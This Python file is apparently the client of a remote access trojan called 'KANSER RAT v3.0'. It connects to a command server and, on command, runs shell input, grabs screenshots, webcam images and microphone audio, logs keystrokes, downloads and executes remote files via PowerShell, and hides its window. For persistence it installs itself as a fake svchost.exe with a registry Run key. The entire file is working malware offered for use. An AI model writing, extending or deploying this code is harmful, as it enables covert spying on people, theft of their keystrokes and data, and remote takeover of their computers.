#!/usr/bin/env python3
"""KANSER RAT v3.0 — Client Payload (fixed)"""
import socket, json, os, sys, time, threading, base64, subprocess, platform, shutil, tempfile, ctypes

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 4444
RECONNECT_DELAY = 5

C = {"R":"\033[91m","G":"\033[92m","Y":"\033[93m","B":"\033[94m","M":"\033[95m","W":"\033[0m","X":"\033[90m"}

def send(sock, data):
    try: sock.send((json.dumps(data, default=str) + "\n").encode())
    except: pass

def sysinfo():
    return f"OS:{platform.system()} {platform.release()}|Host:{platform.node()}|User:{os.getenv('USERNAME','?')}|CPU:{os.cpu_count()}|PID:{os.getpid()}"

def handle_cmd(sock, msg):
    cmd = msg.get("cmd",""); data = msg.get("data","")
    try:
        if cmd == "sysinfo": send(sock, {"type":"sysinfo","data":sysinfo()})
        elif cmd == "shell":
            out = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, timeout=15).decode(errors="ignore")
            send(sock, {"type":"shell","data":out[:4000]})
        elif cmd == "screenshot":
            try:
                from PIL import ImageGrab; import io
                img = ImageGrab.grab(); buf = io.BytesIO(); img.save(buf, format="JPEG", quality=30)
                send(sock, {"type":"screen","data":base64.b64encode(buf.getvalue()).decode()})
            except: send(sock, {"type":"screen","data":"PIL not installed"})
        elif cmd == "webcam":
            try:
                import cv2; import numpy as np
                cam = cv2.VideoCapture(0)
                if cam.isOpened():
                    ret, frame = cam.read(); cam.release()
                    if ret:
                        _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 40])
                        send(sock, {"type":"webcam","data":base64.b64encode(buf.tobytes()).decode()})
                else: send(sock, {"type":"webcam","data":"No camera"})
            except: send(sock, {"type":"webcam","data":"opencv not installed"})
        elif cmd == "mic":
            try:
                import pyaudio, wave, io
                CHUNK, FORMAT, CHANNELS, RATE, DUR = 1024, 8, 1, 22050, 5
                p = pyaudio.PyAudio(); stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
                frames = [stream.read(CHUNK) for _ in range(int(RATE/CHUNK*DUR))]
                stream.stop_stream(); stream.close(); p.terminate()
                buf = io.BytesIO(); wf = wave.open(buf,"wb"); wf.setnchannels(CHANNELS); wf.setsampwidth(p.get_sample_size(FORMAT)); wf.setframerate(RATE); wf.writeframes(b"".join(frames)); wf.close()
                send(sock, {"type":"mic","data":base64.b64encode(buf.getvalue()).decode()})
            except: send(sock, {"type":"mic","data":"pyaudio not installed"})
        elif cmd == "persist":
            try:
                exe = sys.executable; dst_dir = os.path.join(os.getenv("APPDATA",""), "Microsoft","Windows")
                os.makedirs(dst_dir, exist_ok=True); dst = os.path.join(dst_dir, "svchost.exe")
                shutil.copy2(exe, dst); subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinHost" /t REG_SZ /d "{dst}" /f', shell=True, capture_output=True)
                send(sock, {"type":"status","data":"Persistence installed"})
            except Exception as e: send(sock, {"type":"status","data":f"Failed: {e}"})
        elif cmd == "uninstall":
            try:
                subprocess.run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinHost" /f', shell=True, capture_output=True)
                send(sock, {"type":"status","data":"Uninstalled"})
            except: pass
        elif cmd == "download_exec":
            try:
                dst = os.path.join(tempfile.gettempdir(), "update.exe")
                subprocess.run(f"powershell -c \"Invoke-WebRequest -Uri '{data}' -OutFile '{dst}'; Start-Process '{dst}'\"", shell=True)
                send(sock, {"type":"status","data":"Download+Exec started"})
            except: pass
        elif cmd == "keylog_start":
            threading.Thread(target=_keylog_thread, args=(sock,), daemon=True).start()
        elif cmd == "proc_list":
            try:
                out = subprocess.check_output("tasklist /fo csv /nh", shell=True, timeout=5).decode(errors="ignore")
                send(sock, {"type":"file_list","data":out[:2000]})
            except: pass
        elif cmd == "list_files":
            try:
                path = data or os.getcwd()
                items = os.listdir(path); result = []
                for item in items[:50]:
                    full = os.path.join(path, item)
                    try:
                        if os.path.isdir(full): result.append(f"[DIR] {full}")
                        else: result.append(f"      {full} ({os.path.getsize(full)}b)")
                    except: pass
                send(sock, {"type":"file_list","data":"\n".join(result)})
            except: pass
    except Exception as e:
        try: send(sock, {"type":"error","data":str(e)})
        except: pass

def _keylog_thread(sock):
    try:
        import pynput.keyboard
        log = []
        def on_press(key):
            try: log.append(key.char)
            except: log.append(f"[{key}]")
            if len(log) >= 30:
                try: send(sock, {"type":"keylog","data":"".join(log)})
                except: pass
                log.clear()
        pynput.keyboard.Listener(on_press=on_press).start()
        while True: time.sleep(10)
    except: pass

def main():
    print(f"{C['G']}KANSER RAT Client v3.0{C['W']}")
    print(f"{C['Y']}Server: {SERVER_HOST}:{SERVER_PORT}{C['W']}")
    print(f"{C['X']}Press Ctrl+C to stop{C['W']}\n")

    attempt = 0
    while True:
        attempt += 1
        try:
            s = socket.socket(); s.settimeout(30)
            print(f"{C['Y']}[..] Connecting (attempt {attempt})...{C['W']}", end=" ", flush=True)
            s.connect((SERVER_HOST, SERVER_PORT))
            print(f"{C['G']}Connected!{C['W']}")
            send(s, {"type":"sysinfo","data":sysinfo()})
            attempt = 0  # reset

            threading.Thread(target=lambda: [time.sleep(30), send(s, {"type":"heartbeat","data":"1"})] * 999, daemon=True).start()

            buf = ""
            while True:
                data = s.recv(65536).decode(errors="ignore")
                if not data: break
                buf += data
                while "\n" in buf:
                    line, buf = buf.split("\n", 1)
                    try: threading.Thread(target=handle_cmd, args=(s, json.loads(line)), daemon=True).start()
                    except: pass
        except KeyboardInterrupt:
            print(f"\n{C['Y']}Stopped by user{C['W']}")
            break
        except Exception as e:
            print(f"{C['R']}Failed: {e}{C['W']}")
            if attempt % 10 == 0:
                print(f"{C['Y']}  Still trying... Is the server running? python kanser.py -> 1{C['W']}")
            time.sleep(RECONNECT_DELAY)
        finally:
            try: s.close()
            except: pass

if __name__ == "__main__":
    if os.name == "nt":
        try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except: pass
    try: main()
    except KeyboardInterrupt: pass
